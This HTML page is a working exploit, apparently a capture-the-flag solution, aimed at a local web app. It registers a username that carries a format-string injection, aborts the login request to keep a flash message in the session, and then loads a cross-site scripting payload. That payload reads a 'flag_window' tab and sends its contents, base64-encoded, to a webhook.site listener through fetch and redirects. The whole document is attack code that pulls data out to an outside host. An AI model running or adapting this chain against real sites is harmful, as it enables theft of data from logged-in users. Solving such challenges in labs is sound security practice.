<!DOCTYPE html>
<html>
<head>
    <title>Exploit</title>
</head>
<body>
    <h1>Exploiting...</h1>
    <script>
        const TARGET = 'http://web:11202';
        // REPLACE THIS with your listener URL (e.g. webhook.site or your local IP)
        const ATTACKER = 'https://webhook.site/8e7ccc1c-b998-40ff-bc7f-14c432def363'; 

        // Username that triggers the format string injection
        // Uses 'x' query parameter from the request
        const MALICIOUS_USER = '{request.query_params[x]}';
        const PASSWORD = 'password123';
        
        // XSS Payload to read flag from named window
        const RAW_PAYLOAD = `
            setTimeout(() => {
                try {
                    // Access the named window opened previously
                    const flagWin = window.open('', 'flag_window');
                    if (flagWin) {
                        // Wait a bit to ensure loaded (though we waited in parent)
                        setTimeout(() => {
                            try {
                                const flag = flagWin.document.body.innerText;
                                // Send flag to attacker
                                fetch('${ATTACKER}/?flag=' + btoa(flag), {mode: 'no-cors'});
                                // Also trying redirection as backup
                                location.href = '${ATTACKER}/?flag_redirect=' + btoa(flag);
                            } catch(e) {
                                location.href = '${ATTACKER}/?error=' + btoa(e.message);
                            }
                        }, 500);
                    } else {
                        location.href = '${ATTACKER}/?error=no_window';
                    }
                } catch(e) {
                    location.href = '${ATTACKER}/?error=' + btoa(e.message);
                }
            }, 500);
        `;
        const XSS_PAYLOAD = `<script>${RAW_PAYLOAD}<\/script>`;
        
        async function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        async function run() {
            console.log('Step 1: Open Flag Window');
            // 1. Open the Flag Window (Bot is currently logged in as itself)
            // This loads the flag into the window/tab
            window.open(`${TARGET}/flag`, 'flag_window');
            
            await sleep(1500); // Wait for flag to load

            console.log('Step 2: Register Malicious User');
            // 2. Register the malicious user
            try {
                const formData = new URLSearchParams();
                formData.append('username', MALICIOUS_USER);
                formData.append('password', PASSWORD);
                
                await fetch(`${TARGET}/register`, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors'
                });
            } catch(e) {
                console.log('Register error:', e);
            }
            
            await sleep(500);

            console.log('Step 3: Login with Timing Attack');
            // 3. Login with Timing Attack (Abort Redirect)
            const controller = new AbortController();
            const loginData = new URLSearchParams();
            loginData.append('username', MALICIOUS_USER);
            loginData.append('password', PASSWORD);
            
            try {
                fetch(`${TARGET}/login`, {
                    method: 'POST',
                    body: loginData,
                    mode: 'no-cors',
                    signal: controller.signal
                }).catch(e => {}); // Ignore abort error
            } catch(e) {}

            // Wait enough for POST to be sent, but abort before redirect
            // This preserves the Flash Message in the session
            await sleep(150); 
            controller.abort();
            
            await sleep(500);

            console.log('Step 4: Trigger XSS');
            // 4. Navigate to the XSS trigger URL
            // The Flash Message "Welcome back, {request.query_params[x]}!" is waiting
            const xssUrl = `${TARGET}/?x=${encodeURIComponent(XSS_PAYLOAD)}`;
            
            window.location = xssUrl;
        }

        run();
    </script>
</body>
</html>
